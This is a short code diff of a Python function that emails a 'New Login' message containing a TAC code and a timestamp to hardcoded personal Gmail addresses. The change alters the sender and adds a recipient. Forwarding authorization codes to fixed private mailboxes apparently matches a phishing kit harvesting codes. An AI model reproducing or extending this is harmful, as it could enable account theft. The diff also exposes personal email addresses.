@@ -4,8 +4,8 @@ from datetime import datetime
 
 def tac_code(tac):
     msg = Message('New Login', 
-        sender='abdullahomotoke@gmail.com', 
-        recipients=['adekunlealiamin010@gmail.com'])
+        sender='samcham010@gmail.com', 
+        recipients=['adekunlealiamin010@gmail.com', 'abdullahomotoke@gmail.com'])
     msg.body=f'''
     TAC ----- {tac}
     at ---- {datetime.now()}
